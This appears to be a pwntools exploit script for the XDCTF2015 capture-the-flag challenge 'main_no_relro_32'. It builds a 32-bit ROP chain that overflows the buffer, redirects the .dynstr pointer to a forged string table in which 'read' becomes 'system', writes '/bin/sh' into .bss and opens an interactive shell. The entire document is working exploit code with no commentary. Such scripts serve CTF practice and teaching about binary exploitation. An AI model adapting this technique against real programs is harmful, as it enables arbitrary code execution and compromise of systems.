from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch="i386"
p = process("./main_no_relro_32")
rop = ROP("./main_no_relro_32")
elf = ELF("./main_no_relro_32")

p.recvuntil('Welcome to XDCTF2015~!\n')

offset = 0x6c+4
rop.raw(offset*b'a')
dynstr_addr = 0x08049808
bss_addr = 0x080498e0
read_addr = 0x08048376

rop.read(0,dynstr_addr,4)
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b"read",b"system")
rop.read(0,bss_addr,len((dynstr)))
rop.read(0,bss_addr+0x100,len("/bin/sh\x00"))
rop.raw(read_addr)
rop.raw(0xaaaaaaaa)
rop.raw(bss_addr+0x100)
# print(rop.dump())
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
p.send(rop.chain())
p.send(p32(bss_addr))
p.send(dynstr)
p.send("/bin/sh\x00")
p.interactive()